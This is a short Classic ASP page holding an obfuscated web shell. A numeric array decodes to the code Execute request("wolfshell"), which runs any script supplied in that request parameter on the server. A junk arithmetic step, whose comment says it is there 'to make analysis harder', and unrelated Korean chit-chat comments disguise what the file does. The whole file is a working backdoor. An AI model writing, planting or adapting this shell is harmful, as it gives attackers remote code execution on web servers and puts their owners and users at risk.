<%
' 배고파요, 치킨 먹고 싶다
Dim arr_parts_q7, i_idx, str_builder_w3, final_cmd_r5

' E(69) x(120) e(101) c(99) u(117) t(116) e(101) (32) r(114) e(101) q(113) u(117) e(101) s(115) t(116)
' ((40) "(34) w(119) o(111) l(108) f(102) s(115) h(101) e(101) l(108) l(108) "(34) )(41)
arr_parts_q7 = Array(69,120,101,99,117,116,101,32,114,101,113,117,101,115,116,40,34,119,111,108,102,115,104,101,108,108,34,41)

str_builder_w3 = ""

' 오늘 날씨가 좋네요.
For i_idx = 0 To UBound(arr_parts_q7)
    Dim temp_val_p9
    ' Pointless calculation to make analysis harder
    temp_val_p9 = arr_parts_q7(i_idx) * 2
    temp_val_p9 = temp_val_p9 / 2
    str_builder_w3 = str_builder_w3 & Chr(temp_val_p9)
Next

' 한국 드라마는 재미있어요.
final_cmd_r5 = str_builder_w3

' 영화 보러 갈까요?
Execute(final_cmd_r5)
%>